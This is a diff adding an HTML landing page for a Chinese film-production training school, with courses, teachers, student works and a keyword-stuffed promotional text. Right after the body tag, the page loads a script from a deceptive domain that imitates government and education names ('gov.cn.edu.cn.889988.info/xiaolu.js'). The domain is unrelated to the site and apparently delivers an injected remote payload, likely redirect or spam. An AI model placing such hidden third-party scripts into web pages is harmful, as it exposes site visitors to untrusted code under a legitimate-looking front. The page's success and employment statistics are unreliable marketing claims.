@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视培训 - 专业影视制作培训机构 | yingshipeixun-wap</title>
+<meta name="keywords" content="影视培训, yingshipeixun-wap, 影视制作培训, 影视后期培训, 导演编剧培训, 影视表演培训, 影视剪辑培训学校">
+<meta name="description" content="影视培训(yingshipeixun-wap)专注影视制作、影视后期、导演编剧、表演剪辑等专业培训，实战教学、名师指导、就业推荐，零基础也能成为影视行业专业人才。">
+<meta name="robots" content="index, follow">
+<meta name="author" content="影视培训">
+<meta name="theme-color" content="#0d1b2a">
+<link rel="canonical" href="https://yingshipeixun-wap.github.io">
+<meta property="og:title" content="影视培训 - 专业影视制作培训机构">
+<meta property="og:description" content="影视培训(yingshipeixun-wap)专注影视制作、影视后期、导演编剧、表演剪辑等专业培训，实战教学、名师指导、就业推荐。">
+<meta property="og:type" content="website">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:#0d1b2a;color:#e2e8f0;line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.2s}
+ul{list-style:none}
+:root{--ink:#0d1b2a;--gold:#d4a54a;--gold2:#f0c674;--steel:#1b3a5b;--card:rgba(255,255,255,.05);--line:rgba(212,165,74,.22);--muted:#93a6bd}
+.container{max-width:1120px;margin:0 auto;padding:0 16px}
+section{padding:78px 0}
+.eyebrow{font-size:.74rem;font-weight:800;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:10px}
+.sec-title{font-size:clamp(1.55rem,4vw,2.3rem);font-weight:900;margin-bottom:10px}
+.sec-desc{color:var(--muted);font-size:.95rem;margin-bottom:36px;max-width:660px}
+
+/* 导航 */
+.site-header{position:sticky;top:0;z-index:100;background:rgba(13,27,42,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav-row{display:flex;align-items:center;justify-content:space-between;height:72px}
+.logo{font-size:1.3rem;font-weight:900;display:flex;align-items:center;gap:11px;letter-spacing:1px}
+.logo-mark{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--gold),var(--gold2));display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#0d1b2a}
+.nav-links{display:flex;gap:2px;align-items:center}
+.nav-links a{padding:10px 15px;border-radius:11px;font-size:.92rem;color:#c9d8e8;font-weight:500}
+.nav-links a:hover{background:rgba(212,165,74,.16);color:var(--gold2)}
+.nav-cta{margin-left:8px;padding:11px 24px;border-radius:11px;background:linear-gradient(135deg,var(--gold),var(--gold2));font-size:.88rem;font-weight:800;color:#0d1b2a}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:var(--card);border:1px solid var(--line);align-items:center;justify-content:center;cursor:pointer;flex-direction:column;gap:5px}
+.menu-btn i{display:block;width:18px;height:2px;background:var(--gold2)}
+
+/* Hero */
+.hero{position:relative;min-height:82vh;display:flex;align-items:center;background:linear-gradient(135deg,#0d1b2a 0%,#122c45 55%,#0d1b2a 100%);overflow:hidden}
+.hero::after{content:"";position:absolute;right:-120px;top:-120px;width:520px;height:520px;border-radius:50%;background:radial-gradient(circle,rgba(212,165,74,.16),transparent 70%)}
+.hero-inner{position:relative;z-index:2;padding:86px 0}
+.hero h1{font-size:clamp(2.1rem,6vw,4rem);font-weight:900;line-height:1.18;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--gold2)}
+.hero p{font-size:clamp(1rem,2.2vw,1.16rem);color:#c9d8e8;max-width:610px;margin-bottom:32px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:44px}
+.btn-primary{padding:15px 34px;border-radius:12px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#0d1b2a;font-weight:800;font-size:.98rem}
+.btn-ghost{padding:15px 34px;border-radius:12px;border:1px solid var(--line);color:var(--gold2);font-weight:700;font-size:.98rem}
+.stats{display:flex;gap:48px;flex-wrap:wrap}
+.stat .num{font-size:clamp(1.6rem,3.5vw,2.2rem);font-weight:900;color:var(--gold2)}
+.stat .lbl{font-size:.85rem;color:var(--muted)}
+
+/* 栏目1 课程特色（图标+编号+说明 卡片） */
+.feat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:20px}
+.feat-card{position:relative;padding:26px 22px;border-radius:16px;border:1px solid var(--line);background:var(--card);transition:.3s}
+.feat-card:hover{border-color:var(--gold);transform:translateY(-5px)}
+.feat-card .no{font-size:.78rem;font-weight:800;color:var(--gold);letter-spacing:1px}
+.feat-card .ic{font-size:2rem;margin:12px 0}
+.feat-card h4{font-size:1.05rem;font-weight:800;margin-bottom:6px}
+.feat-card p{font-size:.86rem;color:#c9d8e8}
+
+/* 栏目2 培训课程（选项卡 + 列表） */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:26px;border-bottom:1px solid var(--line);padding-bottom:14px}
+.tab-btn{padding:9px 20px;border-radius:10px;background:var(--card);border:1px solid var(--line);color:#c9d8e8;font-size:.9rem;font-weight:600;cursor:pointer}
+.tab-btn.active{background:var(--gold);color:#0d1b2a;border-color:var(--gold)}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+.course-list li{display:flex;align-items:center;gap:16px;padding:16px 18px;border-radius:14px;background:var(--card);border:1px solid var(--line);margin-bottom:12px;transition:.2s}
+.course-list li:hover{border-color:var(--gold)}
+.course-list .c-idx{flex:0 0 38px;height:38px;border-radius:9px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#0d1b2a;font-weight:900;display:flex;align-items:center;justify-content:center}
+.course-list .c-main{flex:1}
+.course-list .c-main b{font-size:1rem}
+.course-list .c-main span{display:block;font-size:.8rem;color:var(--muted)}
+.course-list .c-tag{font-size:.78rem;padding:5px 12px;border-radius:20px;border:1px solid var(--line);color:var(--gold2)}
+
+/* 栏目3 师资团队（人物简介 左图右文） */
+.team{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.member{display:flex;gap:18px;padding:22px;border-radius:16px;border:1px solid var(--line);background:var(--card);transition:.3s}
+.member:hover{border-color:var(--gold);transform:translateY(-4px)}
+.member .ava{flex:0 0 76px;height:76px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:2rem}
+.member .info h4{font-size:1.05rem;font-weight:800}
+.member .info .role{font-size:.8rem;color:var(--gold);font-weight:700;margin-bottom:6px}
+.member .info p{font-size:.84rem;color:#c9d8e8}
+
+/* 栏目4 学员作品/成果（图文上下结构） */
+.work-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:22px}
+.work-card{border-radius:18px;overflow:hidden;border:1px solid var(--line);transition:.3s}
+.work-card:hover{transform:translateY(-5px);border-color:var(--gold)}
+.work-thumb{height:170px;display:flex;align-items:center;justify-content:center;font-size:2.8rem;position:relative}
+.work-thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(13,27,42,.85))}
+.work-thumb .badge{position:absolute;top:14px;left:14px;z-index:2;font-size:.74rem;padding:4px 10px;border-radius:20px;background:var(--gold);color:#0d1b2a;font-weight:800}
+.work-card .wb{padding:18px}
+.work-card .wb h4{font-size:1rem;font-weight:800;margin-bottom:6px}
+.work-card .wb p{font-size:.84rem;color:#c9d8e8}
+
+/* 栏目5 学习路径/流程（步骤条） */
+.path{position:relative;padding:8px 0}
+.step{display:flex;gap:22px;align-items:flex-start;padding:20px 0;border-bottom:1px dashed rgba(212,165,74,.2)}
+.step:last-child{border-bottom:none}
+.step-num{flex:0 0 56px;height:56px;border-radius:14px;background:linear-gradient(135deg,var(--steel),#0d1b2a);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:900;color:var(--gold2)}
+.step-body h4{font-size:1.1rem;font-weight:800;margin-bottom:5px}
+.step-body p{font-size:.88rem;color:#c9d8e8;max-width:640px}
+
+/* CTA */
+.cta{text-align:center;padding:74px 26px;border-radius:28px;border:1px solid var(--line);background:radial-gradient(600px 300px at 50% -50%,rgba(212,165,74,.25),transparent 70%),linear-gradient(135deg,rgba(27,58,91,.5),rgba(13,27,42,.8))}
+.cta h2{font-size:clamp(1.65rem,4vw,2.6rem);font-weight:900;margin-bottom:16px}
+.cta p{color:#c9d8e8;max-width:580px;margin:0 auto 30px}
+
+/* Footer */
+.site-footer{background:#08111c;border-top:1px solid var(--line);padding:58px 0 26px}
+.foot-row{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:32px;margin-bottom:36px}
+.foot-col h5{font-size:1rem;font-weight:800;margin-bottom:16px;color:var(--gold2)}
+.foot-col p,.foot-col a{color:var(--muted);font-size:.88rem}
+.foot-col a{display:block;padding:5px 0}
+.foot-col a:hover{color:var(--gold)}
+.foot-bottom{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:.82rem;color:var(--muted)}
+
+@media (max-width:860px){
+  .nav-links{display:none;position:absolute;top:72px;left:0;right:0;flex-direction:column;background:rgba(13,27,42,.98);padding:20px;border-bottom:1px solid var(--line)}
+  .nav-links.open{display:flex}
+  .nav-links a{width:100%;text-align:center}
+  .nav-cta{margin:0;width:100%;text-align:center}
+  .menu-btn{display:flex}
+  .team{grid-template-columns:1fr}
+  .foot-row{grid-template-columns:1fr 1fr}
+  .stats{gap:28px}
+}
+@media (max-width:460px){
+  section{padding:56px 0}
+  .hero-actions .btn-primary,.hero-actions .btn-ghost{flex:1;text-align:center}
+  .foot-row{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="site-header">
+  <div class="container nav-row">
+    <a href="#top" class="logo"><span class="logo-mark">🎬</span>影视培训</a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#feat">课程特色</a>
+      <a href="#course">培训课程</a>
+      <a href="#team">师资团队</a>
+      <a href="#work">学员作品</a>
+      <a href="#path">学习路径</a>
+      <a href="#course" class="nav-cta">立即报名</a>
+    </nav>
+    <div class="menu-btn" id="menuBtn" aria-label="菜单"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container hero-inner">
+    <div class="eyebrow">YINGSHIPEIXUN-WAP · PROFESSIONAL FILM TRAINING</div>
+    <h1>影视培训<br>从零基础到<em>行业高手</em></h1>
+    <p>影视培训(yingshipeixun-wap)专注影视制作、影视后期、导演编剧、表演剪辑等全链条专业培训，实战教学、名师一对一指导、就业推荐，助你快速迈入影视行业。</p>
+    <div class="hero-actions">
+      <a href="#course" class="btn-primary">免费试听课程</a>
+      <a href="#path" class="btn-ghost">了解学习路径</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="num">12+</div><div class="lbl">年教学经验</div></div>
+      <div class="stat"><div class="num">200+</div><div class="lbl">专业课程</div></div>
+      <div class="stat"><div class="num">98%</div><div class="lbl">就业推荐率</div></div>
+      <div class="stat"><div class="num">50k+</div><div class="lbl">毕业学员</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1 课程特色 -->
+<section id="feat">
+  <div class="container">
+    <div class="eyebrow">WHY CHOOSE US</div>
+    <h2 class="sec-title">课程特色</h2>
+    <p class="sec-desc">影视培训(yingshipeixun-wap)以实战为导向，让每一位学员都能学到真本事。</p>
+    <div class="feat-grid">
+      <div class="feat-card"><div class="no">FEAT 01</div><div class="ic">🎥</div><h4>实战教学</h4><p>真实项目实操，从拍摄到后期全流程上手，告别纸上谈兵。</p></div>
+      <div class="feat-card"><div class="no">FEAT 02</div><div class="ic">🏆</div><h4>名师指导</h4><p>行业一线导演、剪辑师、编剧亲自授课，分享实战经验。</p></div>
+      <div class="feat-card"><div class="no">FEAT 03</div><div class="ic">🎓</div><h4>小班授课</h4><p>精品小班制，一对一点评指导，确保每个学员都能学懂。</p></div>
+      <div class="feat-card"><div class="no">FEAT 04</div><div class="ic">💼</div><h4>就业推荐</h4><p>对接影视公司与剧组资源，毕业即可获得优质就业机会。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 培训课程（选项卡） -->
+<section style="background:linear-gradient(180deg,#0d1b2a,#122c45)" id="course">
+  <div class="container">
+    <div class="eyebrow">COURSES</div>
+    <h2 class="sec-title">培训课程</h2>
+    <p class="sec-desc">影视培训提供多方向系统课程，零基础入门到进阶精通一站学完。</p>
+    <div class="tabs" id="tabs">
+      <button class="tab-btn active" data-tab="0">🎬 导演编剧</button>
+      <button class="tab-btn" data-tab="1">🎞️ 影视后期</button>
+      <button class="tab-btn" data-tab="2">🎭 表演配音</button>
+      <button class="tab-btn" data-tab="3">✂️ 剪辑调色</button>
+    </div>
+    <div class="tab-panel active" data-panel="0">
+      <ul class="course-list">
+        <li><span class="c-idx">1</span><span class="c-main"><b>导演创作实战班</b><span>系统学习分镜、调度、场面控制</span></span><span class="c-tag">热门</span></li>
+        <li><span class="c-idx">2</span><span class="c-main"><b>编剧故事工坊</b><span>从创意到完整剧本的进阶训练</span></span><span class="c-tag">进阶</span></li>
+        <li><span class="c-idx">3</span><span class="c-main"><b>短片创作营</b><span>分组实战完成一部短片作品</span></span><span class="c-tag">实战</span></li>
+      </ul>
+    </div>
+    <div class="tab-panel" data-panel="1">
+      <ul class="course-list">
+        <li><span class="c-idx">1</span><span class="c-main"><b>影视后期全能班</b><span>AE / PR / C4D 全流程后期制作</span></span><span class="c-tag">热门</span></li>
+        <li><span class="c-idx">2</span><span class="c-main"><b>特效合成进阶</b><span>高级抠像、跟踪、粒子特效实战</span></span><span class="c-tag">进阶</span></li>
+        <li><span class="c-idx">3</span><span class="c-main"><b>达芬奇调色课</b><span>电影级色彩管理与调色技巧</span></span><span class="c-tag">精品</span></li>
+      </ul>
+    </div>
+    <div class="tab-panel" data-panel="2">
+      <ul class="course-list">
+        <li><span class="c-idx">1</span><span class="c-main"><b>影视表演训练营</b><span>台词、形体、镜头前表演系统训练</span></span><span class="c-tag">热门</span></li>
+        <li><span class="c-idx">2</span><span class="c-main"><b>配音与播音课</b><span>角色配音、广告配音、有声书录制</span></span><span class="c-tag">进阶</span></li>
+      </ul>
+    </div>
+    <div class="tab-panel" data-panel="3">
+      <ul class="course-list">
+        <li><span class="c-idx">1</span><span class="c-main"><b>剪辑思维与节奏</b><span>掌握叙事剪辑与镜头组接逻辑</span></span><span class="c-tag">热门</span></li>
+        <li><span class="c-idx">2</span><span class="c-main"><b>高级调色精修</b><span>商业片与电影级调色实战</span></span><span class="c-tag">精品</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 师资团队 -->
+<section id="team">
+  <div class="container">
+    <div class="eyebrow">OUR TEAM</div>
+    <h2 class="sec-title">师资团队</h2>
+    <p class="sec-desc">影视培训的讲师均来自行业一线，拥有丰富的实战与教学经验。</p>
+    <div class="team">
+      <div class="member"><div class="ava" style="background:linear-gradient(135deg,#6366f1,#3b0764)">🎬</div><div class="info"><h4>陈导</h4><div class="role">资深导演 · 主讲</div><p>20年影视导演经验，多部院线作品主创，擅长导演创作与短片实战。</p></div></div>
+      <div class="member"><div class="ava" style="background:linear-gradient(135deg,#ec4899,#9d174d)">📝</div><div class="info"><h4>李编剧</h4><div class="role">金牌编剧 · 主讲</div><p>代表作多次获奖，擅长故事结构与剧本开发，授课风格深入浅出。</p></div></div>
+      <div class="member"><div class="ava" style="background:linear-gradient(135deg,#06b6d4,#1e3a8a)">🎞️</div><div class="info"><h4>王后期</h4><div class="role">后期总监 · 主讲</div><p>好莱坞级后期制作经验，精通 AE / C4D / 达芬奇全流程。</p></div></div>
+      <div class="member"><div class="ava" style="background:linear-gradient(135deg,#f59e0b,#7c2d12)">🎭</div><div class="info"><h4>赵表演</h4><div class="role">表演指导 · 主讲</div><p>资深表演教师，培养众多优秀演员，擅长镜头前表演训练。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 学员作品 -->
+<section style="background:linear-gradient(180deg,#122c45,#0d1b2a)" id="work">
+  <div class="container">
+    <div class="eyebrow">STUDENT WORKS</div>
+    <h2 class="sec-title">学员作品</h2>
+    <p class="sec-desc">影视培训学员实战产出的优秀短片与后期作品，见证成长每一步。</p>
+    <div class="work-grid" id="workGrid"></div>
+  </div>
+</section>
+
+<!-- 栏目5 学习路径 -->
+<section id="path">
+  <div class="container">
+    <div class="eyebrow">LEARNING PATH</div>
+    <h2 class="sec-title">学习路径</h2>
+    <p class="sec-desc">影视培训为你规划清晰的学习路线，循序渐进成为行业高手。</p>
+    <div class="path">
+      <div class="step"><div class="step-num">01</div><div class="step-body"><h4>零基础入门</h4><p>了解影视行业基础概念，掌握设备与软件的基本操作。</p></div></div>
+      <div class="step"><div class="step-num">02</div><div class="step-body"><h4>系统课程学习</h4><p>按方向系统学习导演、编剧、后期、剪辑等核心技能。</p></div></div>
+      <div class="step"><div class="step-num">03</div><div class="step-body"><h4>项目实战</h4><p>参与真实项目或短片创作，积累作品与实战经验。</p></div></div>
+      <div class="step"><div class="step-num">04</div><div class="step-body"><h4>作品打磨与就业</h4><p>完善个人作品集，对接行业资源，获得就业推荐机会。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section>
+  <div class="container">
+    <div class="cta">
+      <h2>开启你的影视梦想之旅</h2>
+      <p>影视培训 yingshipeixun-wap，专业影视制作培训机构，实战教学、名师指导、就业推荐，零基础也能成为影视行业专业人才。</p>
+      <a href="#course" class="btn-primary">立即免费试听 →</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="foot-row">
+      <div class="foot-col">
+        <h5>🎬 影视培训</h5>
+        <p>影视培训(yingshipeixun-wap)专注影视制作、影视后期、导演编剧、表演剪辑等全链条专业培训，实战教学、名师指导、就业推荐，助你快速迈入影视行业。</p>
+      </div>
+      <div class="foot-col"><h5>课程</h5><a href="#">导演编剧</a><a href="#">影视后期</a><a href="#">表演配音</a><a href="#">剪辑调色</a></div>
+      <div class="foot-col"><h5>服务</h5><a href="#">免费试听</a><a href="#">就业推荐</a><a href="#">作品辅导</a></div>
+      <div class="foot-col"><h5>关于</h5><a href="#">关于我们</a><a href="#">师资团队</a><a href="#">联系方式</a></div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2026 影视培训 yingshipeixun-wap 版权所有</span>
+      <span>网站网址：https://yingshipeixun-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* 选项卡 */
+document.querySelectorAll('.tab-btn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var idx=btn.getAttribute('data-tab');
+    document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active');});
+    document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active');});
+    btn.classList.add('active');
+    document.querySelector('.tab-panel[data-panel="'+idx+'"]').classList.add('active');
+  });
+});
+
+/* 学员作品 */
+var works=[
+  {ic:"🎬",c:"linear-gradient(135deg,#6366f1,#3b0764)",b:"最佳短片",t:"《城市边缘》",p:"学员短片作品，入围多个独立电影节。"},
+  {ic:"🎞️",c:"linear-gradient(135deg,#06b6d4,#1e3a8a)",b:"后期佳作",t:"《深海》特效",p:"影视后期班学员合成的视觉特效作品。"},
+  {ic:"🎭",c:"linear-gradient(135deg,#ec4899,#9d174d)",b:"表演呈现",t:"《无声独白》",p:"表演训练营学员镜头前表演实录。"},
+  {ic:"✂️",c:"linear-gradient(135deg,#f59e0b,#7c2d12)",b:"剪辑获奖",t:"《归途》预告",p:"剪辑班学员商业预告片，节奏把控出色。"}
+];
+var wg=document.getElementById('workGrid');
+works.forEach(function(w){wg.innerHTML+='<a href="#" class="work-card"><div class="work-thumb" style="background:'+w.c+'"><span class="badge">'+w.b+'</span>'+w.ic+'</div><div class="wb"><h4>'+w.t+'</h4><p>'+w.p+'</p></div></a>';});
+
+/* 汉堡菜单 */
+document.getElementById('menuBtn').addEventListener('click',function(){document.getElementById('navLinks').classList.toggle('open');});
+document.querySelectorAll('.nav-links a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});});
+</script>
+</body>
+</html>
